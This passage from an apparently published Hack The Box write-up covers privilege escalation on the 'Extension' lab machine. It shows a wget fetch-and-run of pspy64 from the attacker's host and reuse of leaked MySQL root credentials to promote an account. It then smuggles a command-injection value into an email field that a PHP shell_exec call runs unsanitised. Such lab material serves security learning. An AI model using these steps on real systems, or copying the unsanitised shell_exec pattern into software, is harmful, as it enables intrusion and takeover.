<span id="cb21-6"></span>
<span id="cb21-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean@extension:~$</span> cat user.txt</span>
<span id="cb21-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5f1b4312834b32b832925f86933a700b</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>Checking the usual directories and commands for anomalies - <code>/</code>, <code>/opt</code>, <code>/tmp</code>, <code>/var/www</code>, <code>sudo -l</code>, <code>ps aux</code>, <code>netstat -tulpn</code></p>
<p>We find <code>/snap</code>, it’s not very common for HTB boxes but this might be an exception as it’s a Ubuntu host we’re on.</p>
<p>Interesting directories in <strong><code>/opt</code>:</strong></p>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean@extension:/opt$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb22-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 16</span>
<span id="cb22-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>  4 root root 4096 Jan  3  2022 .</span>
<span id="cb22-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 24 root root 4096 Jun 24 14:57 ..</span>
<span id="cb22-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx--x--x</span>  4 root root 4096 Jan  2  2022 containerd</span>
<span id="cb22-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>  4 root root 4096 Jan  3  2022 WebDriver</span></code></pre></div>
<p>Mozilla profile in <code>/tmp</code>:</p>
<div class="sourceCode" id="cb23" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean@extension:/tmp$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb23-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb23-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 13 root root 4096 Sep 10 11:05 rust_mozprofileI7joD3</span></code></pre></div>
<p>However it only contains 3 of the 4 files needed (missing <code>logins.json</code>) and we cant’t read <code>cert9.db</code> nor <code>key4.db</code>:</p>
<div class="sourceCode" id="cb24" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean@extension:/tmp/rust_mozprofileI7joD3$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb24-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 16312</span>
<span id="cb24-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-------</span>  1 root root  229376 Sep 10 07:48 cert9.db</span>
<span id="cb24-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>  1 root root  524288 Sep 10 11:05 cookies.sqlite</span>
<span id="cb24-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-------</span>  1 root root  294912 Sep 10 07:48 key4.db</span></code></pre></div>
<p>A lot of new internal port:</p>
<div class="sourceCode" id="cb25" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean@extension:/var/www$</span> netstat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-tulpn</span></span>
<span id="cb25-2"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> all processes could be identified, non-owned process info</span>
<span id="cb25-3"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">will</span> not be shown, you would have to be root to see it all.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb25-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Active</span> Internet connections <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">only</span> servers<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb25-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span>
<span id="cb25-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 0.0.0.0:9000            0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:3306          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:587           0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:143           0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.53:53           0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                               </span>
<span id="cb25-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:3000          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:25            0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:43743         0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:8000          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:8001          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:993           0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb25-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:41411         0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>    </span></code></pre></div>
<p>Looking in the nginx config we can identify port 3000, 8000 and 8001:</p>
<div class="sourceCode" id="cb26" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jean@extension:/etc/nginx$</span> cat sites-available/default</span>
<span id="cb26-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb26-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server_name</span> _<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb26-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">proxy_pass</span> http://127.0.0.1:8001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb26-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb26-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server_name</span> mail.snippet.htb<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb26-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">proxy_pass</span> http://127.0.0.1:8000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb26-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb26-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server_name</span> dev.snippet.htb<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb26-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">proxy_pass</span> http://127.0.0.1:3000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span></code></pre></div>
<p>Copy over <code>pspy64</code> and see if there’s anything executing behind the scenes:</p>
<div class="sourceCode" id="cb27" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">charlie@extension:/dev/shm$</span> wget http://10.10.14.10/pspy64</span>
<span id="cb27-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">charlie@extension:/dev/shm$</span> chmod +x pspy64</span>
<span id="cb27-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">charlie@extension:/dev/shm$</span> ./pspy64</span>
<span id="cb27-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb27-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/09/11</span> 13:15:01 CMD: UID=0    PID=8058   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> mysql <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> root <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-ptoor</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--database</span> webapp <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--execute</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"delete from snippets where id &gt; 2;"</span></span>
<span id="cb27-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/09/11</span> 13:15:01 CMD: UID=0    PID=8065   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">docker</span> exec 2ee49381d443 sh <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> mysql <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> root <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-ptoor</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--database</span> webapp <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--execute</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"UPDATE users set password='30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82' where email='charlie@snippet.htb';"</span></span>
<span id="cb27-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/09/11</span> 13:15:01 CMD: UID=0    PID=8115   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> mysql <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> root <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-ptoor</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--database</span> webapp <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--execute</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"UPDATE users set password='7f13a99efb779ebbe57cbca71dfac6334dd7e3e6345a353d74912e9843f918b6' where email='jean@snippet.htb';"</span> </span></code></pre></div>
<p>We find credentials and database name for mysql - <code>root:toor</code>. Setup SSH tunnels and change one of the previous found accounts <code>user_type</code> from <em>Member</em> to <strong>Manager</strong>:</p>
<div class="sourceCode" id="cb28" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  .ssh ssh <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-N</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-L</span> 3306:localhost:3306 charlie@extension.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> id_rsa</span>
<span id="cb28-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension mysql <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-h</span> 127.0.0.1 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-D</span> webapp <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> root <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span></span>
<span id="cb28-3"></span>
<span id="cb28-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MySQL</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">webapp</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> from users where email = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'juliana@snippet.htb'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb28-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
<span id="cb28-6"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">name</span>          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">email</span>               <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">email_verified_at</span>   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">password</span>                                                         <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">remember_token</span>                                               <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">created_at</span>          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">updated_at</span>          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_type</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb28-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
<span id="cb28-8"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">701</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Juliana</span> Thiel <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">juliana@snippet.htb</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-01-02</span> 20:15:32 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ogRS7mYef6bK1KDFu0Svdm1C3AwnpBFhiWKRaMV92ubm4nmMmAIcoJRVhcUF</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-01-02</span> 20:15:37 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-06-20</span> 11:46:35 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Member</span>    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb28-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
<span id="cb28-10"></span>
<span id="cb28-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MySQL</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">webapp</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> update users set user_type = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Manager'</span> where users.id = 701<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb28-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Query</span> OK, 1 row affected <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.034</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb28-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Rows</span> matched: 1  Changed: 1  Warnings: 0</span>
<span id="cb28-14"></span>
<span id="cb28-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MySQL</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">webapp</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> select <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> from users where email = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'juliana@snippet.htb'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb28-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
<span id="cb28-17"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">name</span>          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">email</span>               <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">email_verified_at</span>   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">password</span>                                                         <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">remember_token</span>                                               <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">created_at</span>          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">updated_at</span>          <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user_type</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb28-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span>
<span id="cb28-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">701</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Juliana</span> Thiel <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">juliana@snippet.htb</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-01-02</span> 20:15:32 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ogRS7mYef6bK1KDFu0Svdm1C3AwnpBFhiWKRaMV92ubm4nmMmAIcoJRVhcUF</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-01-02</span> 20:15:37 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-06-20</span> 11:46:35 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Manager</span>   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb28-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+</span></span></code></pre></div>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>Logging in as <code>juliana@snippet.htb</code> it doesn’t seem like anything special happened. The only new feature we have is to <em>“Show all”</em> snippets, that including private ones:</p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension09.png" class="img-fluid"></p>
<p>And this <em>“Validate”</em> button for all the users:</p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension10.png" class="img-fluid"></p>
<p>Pressing <em>Validate</em> will send a post request to validate the email of the user, and we’ll get the response <em>“Mail is valid!”</em>.</p>
<p>Playing around in MySQL I tried to change email of <em>Kaleigh Lehner</em> and noticed that entering <code>;</code>, <code>&amp;</code> or <code>|</code> still registered as valid email. Instead of guessing I decide to look in to the source code to see how this function works and find this:</p>
<div class="sourceCode" id="cb29" style="background: #f1f3f5;"><pre class="sourceCode php code-with-copy"><code class="sourceCode php"><span id="cb29-1">jean<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">@</span>extension<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">~/</span>projects<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>laravel<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>app<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>app<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>Http<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>Controllers$ cat AdminController<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>php</span>
<span id="cb29-2">[... snip ...]</span>
<span id="cb29-3">} <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">else</span> {</span>
<span id="cb29-4">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$res</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">shell_exec</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ping -c1 -W1 </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$domain</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> &gt; /dev/null &amp;&amp; echo 'Mail is valid!' || echo 'Mail is not valid!'"</span>)<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb29-5">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> Redirect::back()-&gt;with(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'message'</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">,</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">trim</span>(<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$res</span>))<span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb29-6">}</span></code></pre></div>
<p>The input data isn’t sanitized since we can write directly into the MySQL database and from the vulnerable <code>shell_exec</code> function get command injection.</p>
<div class="sourceCode" id="cb30" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MySQL</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">webapp</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> update users set email = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&amp;id&amp;"</span> where users.id = 895<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
